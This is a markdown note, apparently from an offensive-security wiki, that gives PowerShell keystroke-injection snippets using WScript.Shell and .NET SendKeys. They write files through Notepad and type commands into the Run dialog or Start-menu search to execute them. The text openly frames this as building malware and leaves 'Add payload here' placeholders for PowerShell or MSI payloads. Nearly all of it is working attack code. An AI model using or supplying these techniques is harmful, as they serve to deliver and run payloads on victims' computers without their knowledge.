# PowerShell

> [!INFO] Software-based Keystrokes Limitation
> When executing the malware. It will not bypass UAC prompt due to whatever software limitation that restricts it to inject keystrokes.

## File Transfer via Text Editor

> [!TIP] Enumerate Text Editors
> Do not feel restricted since it's a malware you're trying to create. You can enumerate any text editors that is installed in the system. It doesn't have only exclusive to `notepad.exe` user.

```powershell
$Object_Shell = New-Object -ComObject "WScript.Shell"

$text_editor = "notepad.exe"
$contents = 'This is a String'
$filepath = "C:\path\to\file.txt"

# Open text editor
$Object_Shell.Run($text_editor)
Start-Sleep -Milliseconds 3000

# Write the contents in the text editor
$Object_Shell.SendKeys($contents)
Start-Sleep -Milliseconds 2000

# Open the Save dialog (Ctrl + S)
$Object_Shell.SendKeys("^s")
Start-Sleep -Milliseconds 2000

# Save path of the file then return
$Object_Shell.SendKeys($filepath)
Start-Sleep -Milliseconds 2000
$Object_Shell.SendKeys("{ENTER}")

# Clean up (Optional, but good practice)
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($Object_Shell) | Out-Null
```

Using .NET variant.

```powershell
Add-Type -AssemblyName System.Windows.Forms

$text_editor = "notepad.exe"
$contents = 'This is a String'
$filepath = "C:\path\to\file.txt"

# Open text editor
Start-Process $text_editor
Start-Sleep -Milliseconds 3000

# Write the contents in the text editor
[System.Windows.Forms.SendKeys]::SendWait($contents)
Start-Sleep -Milliseconds 2000

# Open the Save dialog
[System.Windows.Forms.SendKeys]::SendWait("^s")
Start-Sleep -Milliseconds 2000

# Save path of the file
[System.Windows.Forms.SendKeys]::SendWait($filepath)
Start-Sleep -Milliseconds 1000
```

## Dialogue Box

```powershell
# Add payload here. Such as, PowerShell, MSI, etc
$commands = ""
$Object_Shell = New-Object -ComObject "WScript.Shell"

# Open the Start Menu (Ctrl + Esc)
$Object_Shell.SendKeys("^{ESC}")
Start-Sleep -Milliseconds 2000

# Open Dialogue Box (Win + R)
$Object_Shell.SendKeys("r")

# Inject commands then return
$Object_Shell.SendKeys($commands)
Start-Sleep -Milliseconds 1000
$Object_Shell.SendKeys("{ENTER}")

# Clean up (optional, but good practice)
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($Object_Shell) | Out-Null
```

Using .NET variant.

```powershell
Add-Type -AssemblyName System.Windows.Forms
# Add payload here. Such as, PowerShell, MSI, etc
$commands = ""

# Open the Start Menu (Ctrl + Esc)
[System.Windows.Forms.SendKeys]::SendWait("^{ESC}")
Start-Sleep -Milliseconds 1000

# Open Dialogue Box (Win + R)
[System.Windows.Forms.SendKeys]::SendWait("r")
Start-Sleep -Milliseconds 1000

# Inject commands then return
[System.Windows.Forms.SendKeys]::SendWait($commands)
Start-Sleep -Milliseconds 1000
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
```

## Search Bar

```powershell
# Append @ as a prefix in order to execute commands.
# Add payload here. Such as, PowerShell, MSI, etc
$commands = "@"

$Object_Shell = New-Object -ComObject "WScript.Shell"

# Open the Start Menu (Ctrl + Esc)
$Object_Shell.SendKeys("^{ESC}")
Start-Sleep -Milliseconds 2000

# Inject commands then return
$Object_Shell.SendKeys($commands)
Start-Sleep -Milliseconds 1000
$Object_Shell.SendKeys("{ENTER}")

# Clean up (optional, but good practice)
[System.Runtime.InteropServices.Marshal]::ReleaseComObject($Object_Shell) | Out-Null
```

Using .NET variant.

```powershell
Add-Type -AssemblyName System.Windows.Forms

# Append @ as a prefix in order to execute commands.
# Add payload here. Such as, PowerShell, MSI, etc
$commands = "@"

# Open the Start Menu (Ctrl + Esc)
[System.Windows.Forms.SendKeys]::SendWait("^{ESC}")
Start-Sleep -Milliseconds 2000

# Inject commands then return
[System.Windows.Forms.SendKeys]::SendWait($commands)
Start-Sleep -Milliseconds 1000
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
```